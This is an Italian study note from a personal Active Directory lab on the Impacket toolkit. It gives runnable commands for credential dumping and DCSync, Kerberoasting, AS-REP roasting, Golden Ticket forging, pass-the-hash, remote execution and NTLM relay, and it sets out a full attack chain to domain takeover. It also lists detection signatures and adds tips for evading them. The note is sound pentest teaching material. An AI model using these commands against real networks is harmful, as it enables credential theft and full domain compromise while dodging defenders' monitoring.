# Impacket

## Cos'è

**Impacket** è una **collezione di classi Python** che implementano da zero i protocolli di rete usati nei sistemi Windows: [[SMB]], MSRPC, DCOM, WMI, [[Kerberos]], [[LDAP]], [[NetBIOS]], MS-SQL, e altri. Sviluppata originariamente da **CORE Security**, ora mantenuta da **Fortra** (precedentemente SecureAuth) come progetto open-source.

Insieme alla libreria, il progetto include una **suite di script di esempio** che usano la libreria per implementare attacchi pratici. Quegli script sono quello che vedi nelle guide di pentest: `impacket-secretsdump`, `impacket-GetUserSPNs`, `impacket-psexec`, etc.

> [!analogy] Linux parallel Pensa a Impacket come a **Samba + krb5-workstation + Wireshark dissectors + un toolkit di exploitation**, tutto riscritto in Python in modo che tu possa fare query, autenticarti, eseguire comandi remoti, e parlare protocolli Windows senza dipendere dai binari Microsoft o Samba. È **lo standard de facto** per pentest contro Active Directory dal lato Linux.

### Perché Impacket conta

1. **Funziona da Linux** — non hai bisogno di Windows per attaccare Windows
2. **Implementa i protocolli a basso livello** — puoi forgiare pacchetti SMB/Kerberos/etc da zero
3. **Open-source e auditabile** — leggi il codice per capire cosa stai facendo
4. **Standardizzato** — ogni guida di pentest AD ti dice "usa impacket-X"
5. **Modulare** — puoi usarlo come libreria per scrivere i tuoi tool

---

## Installazione

```bash
# Modo consigliato (Linux moderno con PEP 668)
pipx install impacket

# Pip diretto (se non hai pipx)
pip install impacket --break-system-packages

# Da sorgente
git clone https://github.com/fortra/impacket
cd impacket && pip install .

# Su Kali: già preinstallato
```

Dopo l'installazione, ogni script è disponibile come comando con prefisso `impacket-`:

```bash
impacket-secretsdump
impacket-GetUserSPNs
impacket-psexec
# etc...
```

Su alcune distro/installazioni i comandi si chiamano senza prefisso (es. `secretsdump.py`). Funzionalmente identici.

---

## Convenzioni comuni a tutti i tool

### Sintassi del target

Quasi tutti gli script di Impacket usano lo stesso pattern per specificare il target:

```
domain/username:password@target_ip
```

Esempi:

```bash
# Dominio + utente + password + target
impacket-secretsdump corp.local/alice:'Lab123!!'@10.10.10.10

# Senza dominio (workgroup / utente locale)
impacket-psexec administrator:'Password123'@192.168.1.50

# Specificare il DC separatamente
impacket-GetUserSPNs corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10 -request
```

### Modi di autenticazione

Impacket supporta diversi meccanismi di auth, intercambiabili tra gli script:

|Flag|Cosa fa|Uso tipico|
|---|---|---|
|`password` nella URL|Bind con password|Hai la password in chiaro|
|`-hashes LM:NTLM`|**Pass-the-Hash**|Hai l'NT hash da LSASS/secretsdump|
|`-k`|Kerberos auth (usa ticket cache)|Hai un TGT/TGS da `klist`|
|`-aesKey`|Auth con AES Kerberos key|Hai la AES256 key di un account|
|`-no-pass`|Nessuna password (AS-REP roasting)|Solo per GetNPUsers|
|`-ccache`|Usa file ccache specifico|Hai un ticket in file|

Esempio Pass-the-Hash:

```bash
impacket-psexec corp.local/bobadmin@10.10.10.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c
```

L'LM hash è quasi sempre vuoto (`aad3b435b51404eeaad3b435b51404ee` o omesso) su sistemi moderni — solo l'NT hash conta.

---

## Categoria 1 — Credential dumping

### secretsdump — il coltellino svizzero

Il tool più usato in assoluto. Dumpa credenziali da:

- **SAM locale** della macchina (account locali)
- **LSA Secrets** (service account, machine account password)
- **NTDS.dit** via **DCSync** (tutti gli hash del dominio)
- **DCC2 cache** (utenti loggati offline)
- **DPAPI master keys**

```bash
# Locale (SAM + LSA Secrets di una macchina)
impacket-secretsdump corp.local/bobadmin:'Lab123!!'@10.10.10.20

# DCSync sul Domain Controller (richiede privilegi DA o DCSync rights)
impacket-secretsdump corp.local/bobadmin:'Lab123!!'@10.10.10.10 -just-dc-user krbtgt

# DCSync completo (TUTTI gli hash del dominio)
impacket-secretsdump corp.local/bobadmin:'Lab123!!'@10.10.10.10 -just-dc

# Da hash invece di password
impacket-secretsdump corp.local/bobadmin@10.10.10.10 -hashes :8846f7eaee... -just-dc
```

Output tipico:

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/alice:$DCC2$10240#alice#7f4e6e7a...

[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\DC01$:aes256-cts-hmac-sha1-96:7a3b...
CORP\DC01$:aad3b435b51404eeaad3b435b51404ee:7a2b9c...
```

> [!note] Cosa serve per DCSync DCSync richiede il privilegio **"Replicating Directory Changes"** in AD. Lo hanno per default:
> 
> - Domain Admins
> - Enterprise Admins
> - Built-in Administrators
> - Le repliche tra DC stessi
> 
> Se compromettono un account con questi diritti (anche un account non-admin a cui è stato delegato male), puoi fare DCSync senza essere DA.

---

## Categoria 2 — Attacchi Kerberos

### GetUserSPNs — Kerberoasting

Trova tutti gli account con SPN registrato (di solito service account) e richiede un TGS per ciascuno. I TGS sono cifrati con la chiave derivata dalla password dell'account → puoi craccarli offline.

```bash
# Solo enumera SPN, non richiede TGS
impacket-GetUserSPNs corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10

# Richiede TGS (l'attacco vero)
impacket-GetUserSPNs corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10 -request

# Specifico un utente
impacket-GetUserSPNs corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10 -request-user sqlsvc
```

Output:

```
ServicePrincipalName    Name      MemberOf  PasswordLastSet  
----------------------  --------  --------  ---------------------------
MSSQLSvc/sql.corp.local sqlsvc              2024-03-15 10:23:45.123456

$krb5tgs$23$*sqlsvc$CORP.LOCAL$MSSQLSvc/sql.corp.local*$ABC123...
```

Quello stringone è il TGS cifrato. Lo passi a hashcat:

```bash
hashcat -m 13100 tgs.txt rockyou.txt
```

### GetNPUsers — AS-REP Roasting

Trova account con flag **DONT_REQUIRE_PREAUTH** e richiede un AS-REP. L'AS-REP contiene una porzione cifrata con la password dell'utente → cracking offline.

```bash
# Con credenziali (enumera utenti via LDAP poi richiede AS-REP)
impacket-GetNPUsers corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10 -request

# SENZA credenziali (provi una lista di username)
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass
```

La modalità `-no-pass` con lista utenti è il classico attacco "unauthenticated" — non hai bisogno di nessuna credenziale, solo di indovinare un username che abbia la pre-auth disabilitata.

Hashcat: `-m 18200`

### getTGT, getST — Ottenere ticket Kerberos

```bash
# Richiede un TGT per un utente
impacket-getTGT corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10
# → produce alice.ccache

# Carica il ticket
export KRB5CCNAME=alice.ccache

# Verifica
klist

# Richiede un Service Ticket per un servizio
impacket-getST -spn CIFS/dc01.corp.local corp.local/alice -k -no-pass
```

### ticketer — Forge dei ticket (Golden/Silver)

Una volta che hai l'hash di **krbtgt** (via DCSync), puoi creare un **Golden Ticket** — un TGT forgato come se l'avesse rilasciato il KDC:

```bash
# Golden Ticket: accesso totale per chiunque vuoi, validità arbitraria
impacket-ticketer -nthash <krbtgt_nthash> \
    -domain-sid S-1-5-21-1234567890-... \
    -domain corp.local \
    fakeuser

# Carica il ticket
export KRB5CCNAME=fakeuser.ccache

# Ora sei "fakeuser" con privilegi di Domain Admin verso tutto il dominio
impacket-psexec -k corp.local/fakeuser@dc01.corp.local
```

**Silver Ticket**: stesso concetto ma per un singolo servizio (CIFS, HTTP, MSSQL) usando l'hash del service account invece di krbtgt. Meno potente ma anche meno detectable.

---

## Categoria 3 — Remote execution

Quattro modi diversi di eseguire comandi remoti, ognuno con caratteristiche diverse:

### psexec — Il classico (rumoroso)

```bash
impacket-psexec corp.local/bobadmin:'Lab123!!'@10.10.10.20
```

Come funziona internamente:

1. Connessione SMB al target
2. Upload di un binario di servizio in ADMIN$ share
3. Creazione di un nuovo servizio Windows che esegue il binario
4. Start del servizio → ottieni shell SYSTEM
5. Cleanup del servizio e del binario alla disconnessione

> [!warning] Detection psexec lascia parecchi artefatti: eventi 7045 (servizio creato), eventi 4624/4672 (logon), il binario in ADMIN$. È **molto rumoroso** in ambienti con monitoring decente.

### smbexec — Simile a psexec ma "fileless"

```bash
impacket-smbexec corp.local/bobadmin:'Lab123!!'@10.10.10.20
```

Differenza: invece di uploadare un binario, crea un servizio che esegue `cmd.exe /c ...` direttamente. Meno artefatti su disco ma stesso pattern di servizio.

### wmiexec — Via WMI (più pulito)

```bash
impacket-wmiexec corp.local/bobadmin:'Lab123!!'@10.10.10.20
```

Esegue comandi via **WMI** (Windows Management Instrumentation) invece che via servizio:

- Nessun servizio creato
- Nessun binario uploadato
- Esegue come l'utente che si è autenticato (non SYSTEM)
- Comunicazione via DCOM/RPC

È **molto meno rumoroso** di psexec/smbexec ed è il default moderno per molti red team.

### atexec — Via Task Scheduler

```bash
impacket-atexec corp.local/bobadmin:'Lab123!!'@10.10.10.20 'whoami'
```

Esegue un comando creando un task schedulato che si auto-elimina. Lascia eventi 4698 (task created). Utile come fallback se WMI/SMB sono filtrati.

### dcomexec — Via DCOM

```bash
impacket-dcomexec corp.local/bobadmin:'Lab123!!'@10.10.10.20
```

Esegue tramite oggetti DCOM (MMC20.Application, ShellWindows, etc.). Detection è meno matura su questo vettore.

### Confronto

|Tool|Vettore|Artefatti|Account|Detection|
|---|---|---|---|---|
|psexec|SMB + servizio|Binario in ADMIN$, evento 7045|SYSTEM|Alta|
|smbexec|SMB + servizio|Evento 7045|SYSTEM|Alta|
|wmiexec|WMI/DCOM|DCOM logs (opzionali)|Utente|Media|
|atexec|Task Scheduler|Evento 4698|SYSTEM|Alta|
|dcomexec|DCOM|DCOM logs (opzionali)|Utente|Bassa|

---

## Categoria 4 — NTLM Relay

### ntlmrelayx — Il tool definitivo

Coltellino svizzero per **NTLM relay attacks**: cattura autenticazioni NTLM e le rinvia in tempo reale a un altro server. Il client autenticante "diventa" l'attaccante senza saperlo.

```bash
# Setup base: ascolta su SMB/HTTP, relay verso un target specifico
impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support

# Multiple targets
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay verso LDAP per dumpare il dominio (se LDAP signing non è enforcement)
impacket-ntlmrelayx -t ldap://10.10.10.10 --dump-laps --dump-adcs

# Relay verso LDAPS per modificare AD (es. aggiungere computer al dominio)
impacket-ntlmrelayx -t ldaps://10.10.10.10 --add-computer attacker$ password

# Relay verso ADCS (ESC8) per ottenere certificati
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
```

Workflow tipico:

1. Combini ntlmrelayx con **Responder** (per LLMNR/NBT-NS poisoning) o **mitm6** (per DHCPv6 poisoning)
2. Le vittime tentano di autenticarsi a un server inesistente
3. Responder/mitm6 cattura la richiesta NTLM
4. ntlmrelayx la inoltra al target reale prima che scada
5. Esegui azioni a nome dell'utente catturato

> [!warning] La differenza vs Pass-the-Hash NTLM Relay **NON usa l'NT hash**. Usa l'autenticazione live mentre sta avvenendo. Devi avere accesso al traffico nel momento giusto.
> 
> Pass-the-Hash invece **è offline**: hai l'hash, lo usi quando vuoi.

---

## Categoria 5 — SMB e protocolli utility

### smbclient — Client SMB

```bash
impacket-smbclient corp.local/alice:'Lab123!!'@10.10.10.20

# Comandi interattivi:
shares                          # lista share
use C$                         # entra in uno share  
ls                             # lista file
get sensitive.txt              # download
put rogue.exe                  # upload
```

Differenza con `smbclient` Samba: stessa funzionalità ma parla SMB nativamente Python, supporta Kerberos meglio, gestisce hash auth.

### smbserver — Host SMB share temporanea

Ti tira su uno SMB server quick-and-dirty per condividere file o catturare hash:

```bash
# Share semplice da una cartella
impacket-smbserver share /tmp/files -smb2support

# Per catturare hash NTLMv2 (versione semplificata di Responder)
impacket-smbserver share /tmp/files -smb2support
# Quando una vittima si connette a \\tuo_ip\share, lascia l'hash NTLMv2 nei log
```

### lookupsid — Enumerazione SID via RPC

```bash
impacket-lookupsid corp.local/alice:'Lab123!!'@10.10.10.10 20000
```

Itera attraverso i RID (1000, 1001, ...) per scoprire tutti gli utenti del dominio via RPC. Funziona anche con anonymous bind su sistemi vecchi/non-hardened.

### mssqlclient — SQL Server

```bash
impacket-mssqlclient corp.local/alice:'Lab123!!'@10.10.10.30 -windows-auth

# Dentro la shell SQL:
enable_xp_cmdshell
xp_cmdshell whoami
```

Utile quando trovi servizi MSSQL e vuoi sfruttarli per command execution o lateral movement.

### rpcdump — Enumerazione RPC

```bash
impacket-rpcdump @10.10.10.10
```

Lista tutti gli endpoint RPC attivi sul target. Utile per identificare servizi RPC vulnerabili o interfacce abusabili.

### GetADUsers — Enum utenti via LDAP

```bash
impacket-GetADUsers -all corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10
```

Dump rapido di utenti AD con info essenziali (last logon, password last set, etc.). Complementare a BloodHound quando vuoi solo una lista veloce.

---

## Esempio: attacco end-to-end con Impacket

Ricostruiamo la catena completa del tuo lab, sostituendo mimikatz con Impacket dove possibile (perché mimikatz su Windows 11 24H2 non funziona):

```bash
# 1. ENUMERAZIONE — chi c'è nel dominio
impacket-GetADUsers -all corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10

# 2. KERBEROASTING — cracca service account
impacket-GetUserSPNs corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10 -request \
    -outputfile spn.txt
hashcat -m 13100 spn.txt rockyou.txt

# 3. AS-REP ROASTING — cracka account con preauth off
impacket-GetNPUsers corp.local/alice:'Lab123!!' -dc-ip 10.10.10.10 -request \
    -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# 4. Una volta ottenuta password di sqlsvc, lateral movement
impacket-wmiexec corp.local/sqlsvc:'CrackedPassword'@10.10.10.20

# 5. Sulla nuova macchina, dump LSASS (via comsvcs.dll come visto)
# Trasferisci lsass.dmp e parsa offline:
pypykatz lsa minidump lsass.dmp
# → ottieni hash di bobadmin (DA)

# 6. Pass-the-Hash verso DC
impacket-psexec corp.local/bobadmin@10.10.10.10 -hashes :8846f7eaee...

# 7. DCSync — game over
impacket-secretsdump corp.local/bobadmin@10.10.10.10 -hashes :8846f7eaee... -just-dc

# 8. (Opzionale) Golden Ticket per persistence
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local nobody
```

---

## Detection signatures

Le blue team che monitorano l'ambiente sanno riconoscere Impacket:

|Tool|Indicator|
|---|---|
|secretsdump (DCSync)|Event 4662 con `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes)|
|psexec|Service Name `PSEXESVC` o random, Event 7045|
|smbexec|Service Name `BTOBTO` (hardcoded), pipe `\\.\pipe\status`|
|wmiexec|DCOM events, pipe `\\.\pipe\impacket_TEMP`|
|GetUserSPNs|Burst di event 4769 (Kerberos TGS request) con encryption RC4|
|GetNPUsers|Event 4768 senza preauth|
|ntlmrelayx|Auth events da IP inattesi, sessione SMB rapidamente terminata|

Per evadere: rinominare gli script di Impacket (cambiando il service name hardcoded), usare delay tra le query, evitare le default option.

---

## Alternative moderne

Impacket resta lo standard ma alcuni tool stanno emergendo come alternative o complementi:

|Categoria|Impacket|Moderna alternativa|
|---|---|---|
|Tutto-in-uno SMB/AD enum|(impacket combinato)|**netexec (nxc)** — wrapper su impacket + features extra|
|Kerberos tickets|getTGT, ticketer|**Rubeus** (.NET, su Windows)|
|AD enum visuale|GetADUsers + lookupsid|**BloodHound** + bloodhound-python|
|DCSync|secretsdump|**mimikatz** `lsadump::dcsync` (Windows) o **secretsdump** (Linux)|
|ADCS attacks|ntlmrelayx --adcs|**Certipy** (specializzato in ADCS)|

**netexec (precedentemente CrackMapExec)** è di fatto un wrapper di Impacket con interfaccia più ergonomica. Per la maggior parte degli use case quotidiani, `nxc smb`, `nxc ldap`, `nxc winrm` sono più rapidi che chiamare impacket direttamente. Ma sotto, parla gli stessi protocolli di Impacket.

---

## Takeaways

1. **Impacket è il toolkit di base per pentest AD da Linux.** Praticamente ogni guida di pentest AD ti dice "usa impacket-X". Imparalo presto.
    
2. **La sintassi è uniforme**: `domain/user:password@target` con flag tipo `-hashes`, `-k`, `-no-pass` intercambiabili tra tool. Imparata una, le hai imparate tutte.
    
3. **Categorie da memorizzare**:
    
    - `secretsdump` → credenziali (locale + DCSync)
    - `GetUserSPNs` / `GetNPUsers` → Kerberos attacks
    - `psexec` / `wmiexec` → lateral movement
    - `ntlmrelayx` → relay attacks
4. **Impacket implementa i protocolli da zero in Python**. Questo significa che puoi leggere il codice per capire NTLM, Kerberos, SMB a livello packet. È anche un'eccellente fonte di studio per i protocolli stessi.
    
5. **psexec/smbexec sono rumorosi**. Per stealth usa wmiexec o dcomexec.
    
6. **netexec è un wrapper di Impacket** — non un'alternativa. Sotto, parla gli stessi protocolli.
    
7. **Tutti gli output di Impacket sono compatibili con hashcat/john** per cracking offline. Il flusso "Impacket → hashcat" è universale.
    

---

## Wiki-links

- [[LDAP]] — il protocollo che molti tool di Impacket interrogano
- [[lab_active_directory_fedora]] — il lab dove userai Impacket in pratica
- [[credential_dumping_lsa_vs_lsass]] — `secretsdump` agisce esattamente su queste fonti
- [[lab_session_3_lsass_dump_windows11_defenses]] — sessione dove Impacket sostituirà mimikatz
- [[windows_domain_logon]] — la base teorica degli attacchi che Impacket implementa